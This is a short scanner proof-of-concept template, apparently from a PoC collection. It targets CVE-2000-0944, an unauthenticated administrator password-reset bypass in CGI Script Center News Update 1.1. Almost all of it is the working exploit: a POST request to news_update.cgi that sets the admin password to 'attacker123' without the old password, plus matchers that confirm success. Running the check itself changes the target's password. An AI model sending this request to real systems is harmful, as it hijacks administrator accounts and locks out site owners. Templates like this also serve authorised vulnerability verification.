[info]
author = "AVE"
description = "CGI Script Center News Update 1.1 管理员密码修改绕过漏洞验证。通过向密码修改 CGI 接口发送不含原始密码参数的 POST 请求，可无需认证直接重置管理员密码。"
id = "POC-AVE-2000-0690"
name = "CVE-2000-0944 PoC"
severity = "critical"
tags = ["cve-2000-0944"]
vuln_id = [
    "CVE-2000-0944",
    "AVE-2000-0690",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/news_update.cgi"
protocol = "http"

[poc.requests.body]
content = "newpass=attacker123&confirm=attacker123&action=change"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Password Changed",
    "password has been changed",
    "successfully",
]
